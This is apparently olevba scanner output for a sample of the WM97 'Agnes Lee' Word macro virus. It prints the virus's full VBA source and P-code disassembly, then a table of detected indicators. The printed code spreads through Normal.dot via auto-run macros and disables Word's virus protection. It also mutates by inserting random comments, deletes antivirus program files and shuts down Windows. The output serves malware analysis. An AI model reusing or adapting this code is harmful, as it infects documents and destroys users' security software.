olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Agnes.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Agnes.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AGNESLEE.bas 
in file: ./Virus.MSWord.Agnes.a - OLE stream: 'Macros/VBA/AGNESLEE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AGNES()
' -= [WM97.AGNES LEE] =-
On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").CodeModule
PolySize = Int(Rnd * 10)
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
End With
End If
Call LL
Call LEE
WordBasic.FileExit dlg
Tasks.ExitWindows
Application.CommandBars("View").Controls(6).Delete
Application.CommandBars("Format").Controls(12).Delete
Application.CommandBars("Tools").Controls(12).Delete
Application.CommandBars("Tools").Controls(13).Delete
End Sub
Sub LEE()
On Error Resume Next
Kill ("C:\PROGRAM FILES\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAM FILES\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Program Files\Dr Solomon's\Anti-Virus Toolkit\*.*")
Kill ("C:\PROGRAM FILES\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Program Files\Norton Antivirus\V32scan.dll")
Kill ("C:\Program FileS\Norton Antivirus\Virscan.dat")
End Sub
Sub LL()
On Error Resume Next
Application.CommandBars("Edit").Enabled = False
Application.CommandBars("Insert").Enabled = False
Application.CommandBars("Format").Enabled = False
End Sub
Sub AG()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.ConfirmConversions = False
End With
Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").Export "C:\AGNESLEE.sys"
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(74) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(84) + Chr(119) + Chr(111) + Chr(102) + Chr(108) + Chr(111) + Chr(119) + Chr(101) + Chr(114) + Chr(32) + Chr(45) + Chr(61) + Chr(91) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(32) + Chr(86) + Chr(120) + Chr(32) + Chr(84) + Chr(101) + Chr(97) + Chr(109) + Chr(93) + Chr(61) + Chr(45)
.Comments = "WM97.AGNES LEE" & Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(76) + Chr(105) + Chr(77) + Chr(69) + Chr(32) + Chr(49) + Chr(46) + Chr(111)
.Execute
End With
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(x).Name = "AGNES LEE" Then Sex = True
Next x
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(y).Name = "AGNES LEE" Then GirlAGNES = True
Next y
If Sex = True And GirlAGNES = False Then Set OH = ActiveDocument.VBProject
If Sex = False And GirlAGNES = True Then Set OH = NormalTemplate.VBProject
If Sex = True And GirlAGNES = True Then GoTo Ende_
OH.VBComponents.Import "C:\AGNES LEE.sys"
If GirlAGNES = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
If Sex = False Then NormalTemplate.Save
Ende_:
Call AGNES
End Sub
Sub AutoOpen()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub AutoExit()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub AutoNew()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub AutoExec()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub DD()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call AG
Call AGNES
End Sub
Sub FF()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call AG
Call AGNES
End Sub
Sub LA()
On Error Resume Next
Call AG
Call AGNES
WordBasic.FileClose dlg
End Sub
Sub LAL()
On Error Resume Next
Call LA
Call AG
Call AGNES
End Sub
Sub EE()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DL()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogFilePrint).Show
End Sub
Sub BB()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogEditReplace).Show
End Sub
Sub EL()
On Error Resume Next
Call AG
Call AGNES
If Options.CheckGrammarWithSpelling = True Then
ActiveDocument.CheckGrammar
Else
ActiveDocument.CheckSpelling
End If
End Sub
Sub LS()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogsToolsHyphenation).Show
End Sub
Sub EO()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogToolsOptions).Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Agnes.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AGNESLEE - 15231 bytes
' Line #0:
' 	FuncDefn (Sub AGNES())
' Line #1:
' 	QuoteRem 0x0000 0x0017 " -= [WM97.AGNES LEE] =-"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #5:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #6:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #7:
' 	Ld wdAlertsNone 
' 	MemStWith DisplayAlerts 
' Line #8:
' 	EndWith 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #12:
' 	EndWith 
' Line #13:
' 	ArgsCall Read 0x0000 
' Line #14:
' 	LitStr 0x0009 "AGNES LEE"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #15:
' 	Ld ActiveLines 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #16:
' 	StartWithExpr 
' 	LitStr 0x0009 "AGNES LEE"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #17:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #18:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	EndWith 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	StartWithExpr 
' 	LitStr 0x0009 "AGNES LEE"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #23:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #24:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #25:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #26:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #27:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #29:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #30:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #31:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #33:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	EndWith 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	ArgsCall (Call) LL 0x0000 
' Line #37:
' 	ArgsCall (Call) LEE 0x0000 
' Line #38:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0001 
' Line #39:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #40:
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #41:
' 	LitDI2 0x000C 
' 	LitStr 0x0006 "Format"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #42:
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #43:
' 	LitDI2 0x000D 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub LEE())
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	LitStr 0x0025 "C:\PROGRAM FILES\MCAFEE\VIRUSSCAN\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #48:
' 	LitStr 0x0027 "C:\PROGRAM FILES\MCAFEE\VIRUSSCAN95\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #49:
' 	LitStr 0x0034 "C:\Program Files\Dr Solomon's\Anti-Virus Toolkit\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #50:
' 	LitStr 0x001E "C:\PROGRAM FILES\TBAV\TBAV.DAT"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #51:
' 	LitStr 0x0010 "C:\TBAV\TBAV.DAT"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	LitStr 0x002D "C:\Program Files\Norton Antivirus\V32scan.dll"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #53:
' 	LitStr 0x002D "C:\Program FileS\Norton Antivirus\Virscan.dat"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub LL())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "Edit"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #58:
' 	LitVarSpecial (False)
' 	LitStr 0x0006 "Insert"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #59:
' 	LitVarSpecial (False)
' 	LitStr 0x0006 "Format"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub AG())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #64:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #66:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #67:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #68:
' 	EndWith 
' Line #69:
' 	LitStr 0x000F "C:\AGNESLEE.sys"
' 	LitStr 0x0009 "AGNES LEE"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #70:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #71:
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Author 
' Line #72:
' 	LitStr 0x000E "WM97.AGNES LEE"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	MemStWith Comments 
' Line #73:
' 	ArgsMemCallWith Execute 0x0000 
' Line #74:
' 	EndWith 
' Line #75:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #76:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "AGNES LEE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Sex 
' 	EndIf 
' Line #77:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #79:
' 	Ld y 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "AGNES LEE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St GirlAGNES 
' 	EndIf 
' Line #80:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' 	Ld Sex 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GirlAGNES 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set OH 
' 	EndIf 
' Line #82:
' 	Ld Sex 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld GirlAGNES 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set OH 
' 	EndIf 
' Line #83:
' 	Ld Sex 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GirlAGNES 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Ende_ 
' 	EndIf 
' Line #84:
' 	LitStr 0x0010 "C:\AGNES LEE.sys"
' 	Ld OH 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #85:
' 	Ld GirlAGNES 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #86:
' 	Ld Sex 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #87:
' 	Label Ende_ 
' Line #88:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub AutoOpen())
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	ArgsCall (Call) AG 0x0000 
' Line #93:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Sub AutoExit())
' Line #96:
' 	OnError (Resume Next) 
' Line #97:
' 	ArgsCall (Call) AG 0x0000 
' Line #98:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub AutoNew())
' Line #101:
' 	OnError (Resume Next) 
' Line #102:
' 	ArgsCall (Call) AG 0x0000 
' Line #103:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub AutoExec())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	ArgsCall (Call) AG 0x0000 
' Line #108:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub DD())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #113:
' 	ArgsCall (Call) AG 0x0000 
' Line #114:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub FF())
' Line #117:
' 	OnError (Resume Next) 
' Line #118:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #119:
' 	ArgsCall (Call) AG 0x0000 
' Line #120:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub LA())
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	ArgsCall (Call) AG 0x0000 
' Line #125:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #126:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Sub LAL())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	ArgsCall (Call) LA 0x0000 
' Line #131:
' 	ArgsCall (Call) AG 0x0000 
' Line #132:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Sub EE())
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	ArgsCall (Call) AG 0x0000 
' Line #137:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #138:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub DL())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall (Call) AG 0x0000 
' Line #143:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #144:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub BB())
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	ArgsCall (Call) AG 0x0000 
' Line #149:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #150:
' 	Ld wdDialogEditReplace 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub EL())
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' 	ArgsCall (Call) AG 0x0000 
' Line #155:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #156:
' 	Ld Options 
' 	MemLd CheckGrammarWithSpelling 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #157:
' 	Ld ActiveDocument 
' 	ArgsMemCall CheckGrammar 0x0000 
' Line #158:
' 	ElseBlock 
' Line #159:
' 	Ld ActiveDocument 
' 	ArgsMemCall CheckSpelling 0x0000 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Sub LS())
' Line #163:
' 	OnError (Resume Next) 
' Line #164:
' 	ArgsCall (Call) AG 0x0000 
' Line #165:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #166:
' 	Ld wdDialogsToolsHyphenation 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub EO())
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' 	ArgsCall (Call) AG 0x0000 
' Line #171:
' 	ArgsCall (Call) AGNES 0x0000 
' Line #172:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #173:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

